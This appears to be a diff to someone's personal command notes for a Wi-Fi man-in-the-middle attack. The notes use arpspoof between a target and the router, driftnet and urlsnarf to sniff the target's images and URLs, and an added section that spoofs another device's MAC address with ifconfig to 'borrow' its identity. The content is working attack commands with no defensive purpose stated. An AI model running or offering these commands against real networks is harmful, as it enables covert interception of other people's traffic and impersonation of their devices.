@@ -16,9 +16,19 @@
   sysctl -w net.ipv4.ip_forward=1		#ensure ip forwarding (otherwise, no browsing for the target)
   arpspoof -i wlan0 -t 192.168.1.29 192.168.1.1	#between target & router
   arpspoof -i wlan0 -t 192.168.1.1 192.168.1.29	#between router & target
-
+  #arpspoof -i wlp3s0 -t 192.168.2.83 192.168.2.1 #simplKDE 
+  
   driftnet -i wlan0	#show images
   urlsnarf -i wlan0	#doesn't work :(	
 
 #...to be continued
+
+#Addenum: change mac adress with ifconfig
+sudo ifconfig wlp3s0 down
+sudo ifconfig wlp3s0 hw ether 08:11:96:0a:51:e0     #this mac adress being the one you want to "borrow" (get it from arp -a)
+sudo ifconfig wlp3s0 up
+#Back to normal
+sudo ifconfig wlp3s0 down
+sudo ifconfig wlp3s0 hw ether 08:11:96:8d:f9:e8     #...and this one being yours (get it from ifconfig before you begin)
+sudo ifconfig wlp3s0 up
 
